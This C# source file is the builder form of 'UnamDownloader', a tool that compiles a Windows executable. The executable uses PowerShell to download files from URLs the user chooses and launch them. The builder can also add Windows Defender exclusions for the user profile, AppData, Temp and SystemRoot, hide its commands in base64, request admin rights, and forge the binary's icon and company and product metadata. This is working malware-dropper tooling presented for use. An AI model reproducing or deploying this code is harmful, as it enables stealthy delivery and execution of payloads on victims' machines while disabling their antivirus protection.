using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace UnamDownloader
{
    public partial class Builder : Form
    {
        private static Random random = new Random();
        public Vanity vanity = new Vanity();

        public Builder()
        {
            InitializeComponent();
        }

        public void DownloaderCompiler(string savePath)
        {
            if(savePath.Length == 0)
            {
                MessageBox.Show("Save path cannot be empty!", "Incorrect build!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            var providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v3.5");
            CompilerParameters parameters = new CompilerParameters();
            string compilerOptions = " /target:winexe /platform:AnyCPU /optimize ";

            StringBuilder loaderbuilder = new StringBuilder(Properties.Resources.Program);

            if (checkAdmin.Checked)
            {
                loaderbuilder.Replace("DefAdmin", "true");
            }

            if (vanity.checkIcon.Checked && vanity.txtIconPath.Text.Trim().Length > 0)
            {
                compilerOptions += " /win32icon:\"" + vanity.txtIconPath.Text.Trim() + "\"";
            }

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = savePath;
            parameters.CompilerOptions = compilerOptions;
            parameters.IncludeDebugInformation = false;
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");

            List<string> downloads = new List<string>();
            List<string> executes = new List<string>();

            int count = listFiles.Items.Count;
            for (int i = 0; i < count; i++)
            {
                File filevar = ((File)listFiles.Items[i]);
                string droplocation = filevar.comboDropLocation.Text == "Current Directory" ? "%cd%" : "%" + filevar.comboDropLocation.Text + "%";
                downloads.Add(string.Format(@"powershell (New-Object System.Net.WebClient).DownloadFile('{0}', '{1}')", filevar.txtDownloadURL.Text, Path.Combine(droplocation, filevar.txtFilename.Text)));
                if (filevar.toggleExecute.Checked)
                {
                    executes.Add(string.Format(@"powershell Start-Process -FilePath '{0}'", Path.Combine(droplocation, filevar.txtFilename.Text)));
                }
            }

            string exclusions = "powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%' & ";

            loaderbuilder.Replace("#DATA", Convert.ToBase64String(Encoding.ASCII.GetBytes(@"/c " + (checkWD.Checked ? exclusions : "") + string.Join(" & ", downloads.ToArray()) + (executes.Count > 0 ? " & " + string.Join(" & ", executes.ToArray()) : "") + " & exit")));
            loaderbuilder.Replace("#CMD", Convert.ToBase64String(Encoding.ASCII.GetBytes("cmd")));
            loaderbuilder.Replace("DefDebug", "false");
            loaderbuilder.Replace("%Guid%", Guid.NewGuid().ToString());

            if (vanity.checkAssembly.Checked)
            {
                loaderbuilder.Replace("DefAssembly", "true");
                loaderbuilder.Replace("%Title%", vanity.txtAssemblyTitle.Text);
                loaderbuilder.Replace("%Description%", vanity.txtAssemblyDescription.Text);
                loaderbuilder.Replace("%Company%", vanity.txtAssemblyCompany.Text);
                loaderbuilder.Replace("%Product%", vanity.txtAssemblyProduct.Text);
                loaderbuilder.Replace("%Copyright%", vanity.txtAssemblyCopyright.Text);
                loaderbuilder.Replace("%Trademark%", vanity.txtAssemblyTrademark.Text);
                loaderbuilder.Replace("%v1%", vanity.txtAssemblyVersion1.Text);
                loaderbuilder.Replace("%v2%", vanity.txtAssemblyVersion2.Text);
                loaderbuilder.Replace("%v3%", vanity.txtAssemblyVersion3.Text);
                loaderbuilder.Replace("%v4%", vanity.txtAssemblyVersion4.Text);
            }

            var results = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(parameters, loaderbuilder.ToString());
            if (results.Errors.HasErrors)
            {
                foreach(var error in results.Errors)
                {
                    MessageBox.Show(error.ToString(), "Error when building downloader!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        public static string RandomString(int length)
        {
            const string chars = "abcdefghijklmnpqrstuvwxyz";
            const int clength = 25;
            var buffer = new char[length];
            for (var i = 0; i < length; ++i)
            {
                buffer[i] = chars[random.Next(clength)];
            }
            return new string(buffer);
        }

        public static string SaveDialog(string filter)
        {
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = filter;
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }

        private void btnAdd_Click(object sender, EventArgs e)
        {
            File add = new File();
            add.builder = this;
            add.Show();
            listFiles.Items.Add(add);
        }

        private void btnEdit_Click(object sender, EventArgs e)
        {
            if (listFiles.SelectedItem != null)
            {
                ((File)listFiles.SelectedItem).Show();
            }
        }

        private void btnRemove_Click(object sender, EventArgs e)
        {
            if (listFiles.SelectedItem != null)
            {
                ((File)listFiles.SelectedItem).Hide();
                listFiles.Items.Remove(listFiles.SelectedItem);
            }
        }

        private void linkGitHub_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/UnamSanctam/UnamDownloader");
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (listFiles.Items.Count == 0)
            {
                MessageBox.Show("You need to add at least one file to download before building.", "Incorrect build!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            string save = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");
            if (save.Length > 0)
            {
                DownloaderCompiler(save);
            }
        }

        private void btnVanity_Click(object sender, EventArgs e)
        {
            vanity.Show();
        }
    }
}
